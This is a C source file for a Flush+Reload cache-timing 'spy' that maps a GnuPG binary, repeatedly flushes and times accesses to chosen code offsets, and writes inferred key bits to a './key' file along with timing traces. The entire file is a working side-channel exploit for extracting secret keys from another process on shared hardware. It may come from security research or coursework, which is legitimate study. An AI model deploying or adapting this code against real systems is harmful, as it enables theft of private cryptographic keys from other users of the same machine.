#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <assert.h>

#define NTIMING	(int)100000
#define MAXPROBELOCATION (int)10
#define MAXLINELEN (int)512

#ifndef THREASHOLD
#define THREASHOLD (int)100
#endif

unsigned int timestamp[1000000];

static inline unsigned long gettime(){
    volatile unsigned long tl;
    asm __volatile__("lfence\nrdtsc" : "=a" (tl): : "%edx");
    return tl;
}

static inline void flush(char *addrs){
    asm __volatile__ ("mfence\nclflush 0(%0)" : : "r" (addrs) :);
}

static inline int probe(char *adrs){
    volatile unsigned long time;
    asm __volatile__ (
        "  mfence             \n"
        "  lfence             \n"
        "  rdtsc              \n"
        "  lfence             \n"
        "  movl %%eax, %%esi  \n"
        "  movl (%1), %%eax   \n"
        "  lfence             \n"
        "  rdtsc              \n"
        "  subl %%esi, %%eax  \n"
        "  clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        :  "%esi", "%edx");
    return time;
}

struct probe_info{
    int noffsets;
    unsigned long offsets[MAXPROBELOCATION];
    char symbol[MAXPROBELOCATION];
    unsigned long base;
};

struct arguments{
    struct probe_info addr;
    char fileName[100];
};

void printArguments(struct arguments* args){
    printf("\n------------------- INFO -------------------\n");
    printf("fileName of gpg = %s\n", args->fileName);
    printf("noffsets = %d\n", args->addr.noffsets);
    printf("base = %p\n", args->addr.base);

    for(int i = 0; i < args->addr.noffsets; i++){
        printf("offsets = %p ", *(args->addr.offsets+i) );
        printf("chars = %c\n", *(args->addr.symbol+i) );
    }
    printf("\n--------------------------------------------\n");
    return;
}

int readArgs(const char* file, struct arguments* args){

    FILE *fd = fopen(file, "r");

    if(fd == NULL){
        printf("file not found/doesn't exist\n");
        return -1;
    }
    char line[MAXLINELEN];

    while(fgets(line,MAXLINELEN,fd) != NULL){
        char *identifier = strtok(line, " \n");

        if(identifier == NULL){
            continue;
        }

        if(strcmp(identifier, "map") == 0){
            char* binaryfile = strtok(NULL, " \n");
            strcpy(args->fileName, binaryfile);
            continue;
        }else if(strcmp(identifier, "offset") == 0){
            char* addressoffset = strtok(NULL, " \n");
            char* character = strtok(NULL, " \n");
            if(character == NULL || addressoffset == NULL){
                printf("Invalid offset or character representing it\n");
                return -1;
            }

            args->addr.offsets[args->addr.noffsets] = (unsigned long)strtol(addressoffset, NULL, 0); 
            args->addr.symbol[args->addr.noffsets] = character[0];
            args->addr.noffsets++;
            continue;
        }else if(strcmp(identifier, "base") == 0){
            char* addressbase = strtok(NULL, " \n");

            if(addressbase == NULL){
                printf("Invalid base address\n");
                return -1;
            }

            args->addr.base = (unsigned long)strtol(addressbase, NULL, 0); 
            continue;
        }else{
            printf("Invalid indentifier\n");
            return -1;
        }
    }
    fclose(fd);

    if(args->fileName == NULL){
        printf("no binaryfile provided\n");
        return -1;
    }
    
    if(args->addr.noffsets == 0){
        printf("no offset provided\n");
        return -1;
    }
    printArguments(args);
    return 1;
}


int main(int argc, char const *argv[]){
    if(argc < 3){
        printf("usage: ./spy <argument-file> <slot-size>\n");
        exit(1);
    }
    struct arguments * args = malloc(sizeof(struct arguments));
    int x = readArgs(argv[1], args);
    if(x != 1){
        printf("ERROR: arguments reading failed\n");
        exit(1);
    }

    int slotSize = atoi(argv[2]);
    int fd = open(args->fileName, O_RDONLY);
    if(fd < 0){
        printf("ERROR: binaryfile not found at given location\n");
        exit(1);
    }


    struct stat file_stats;
    fstat(fd, &file_stats);
    int size = file_stats.st_size;

    void *binaryMapAddr = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0); // MAP_PRIVATE 
    close(fd);

    int numAddress = args->addr.noffsets;
    char *probe_locations[numAddress];

    for(int i = 0; i < numAddress; i++){
        probe_locations[i] = malloc(sizeof (char*)) ;
        probe_locations[i] = binaryMapAddr + ((args->addr.offsets[i] - args->addr.base) & ~0x3f);
    }

    int probe_timing[numAddress];
    int isProbe_hit[numAddress];

    unsigned int slotstart;
    unsigned int currenttime;
    int hit;
    int debug = 1;


    for(int i = 0; i < numAddress; i++){
        printf("%p\n", probe_locations[i] - (char*)binaryMapAddr);
        flush(probe_locations[i]);
    }
    for(int i = 0; i < 1000; i++){
        for(int i = 0; i < numAddress; i++){
            probe_timing[i] = probe(probe_locations[i]);
        }
    }
    slotstart = gettime();

    long long unsigned int probeNum = 0;
    long long unsigned locs[1000000];

    time_t t1 = time(NULL);
    int ctr = 0 ;
    // 5 sec
    while(time(NULL) - t1 < 5){
        hit = 0;
        probeNum++;
        unsigned int curr = gettime();
        for(int i = 0; i < numAddress; i++){
            probe_timing[i] = probe(probe_locations[i]);
            isProbe_hit[i] = (probe_timing[i] < THREASHOLD);
            hit |= isProbe_hit[i];
            
            currenttime = gettime(); 
            while(currenttime - slotstart < slotSize){
                currenttime = gettime();            
            }       
            slotstart = gettime();
        }
        int isPrint = 0;
        if(hit){
            isPrint = 1;
        }
        if(isPrint == 1){
            timestamp[ctr / 3] = curr;
            for(int i = 0; i < numAddress; i++){
                locs[ctr++] = (long long unsigned)probe_timing[i];  
            }
        }
    }

    int f = open("./key", O_RDWR | O_TRUNC);
    int t = open("./time", O_RDWR | O_TRUNC);
    int p = open("./point", O_RDWR | O_TRUNC);

    for(int i = 0; i < ctr;){
        if(locs[i + 2] < (long long unsigned)THREASHOLD){
            write(f, "1", sizeof(char));
        }else{
            write(f, "0", sizeof(char));
        }
        char buf[32];
        sprintf(buf, "%u ", timestamp[i / 3]);
        write(p, buf, strlen(buf) * sizeof(char));
        for(int j = 0; j < numAddress; j++, i++){
            sprintf(buf, "%llu%c", locs[i], (j == numAddress - 1)? '\n' : ' ');
            write(p, buf, strlen(buf) * sizeof(char));
        }
    }
    write(f, "\n", sizeof(char));
    close(f);
    printf("%d\n", ctr / numAddress);
}

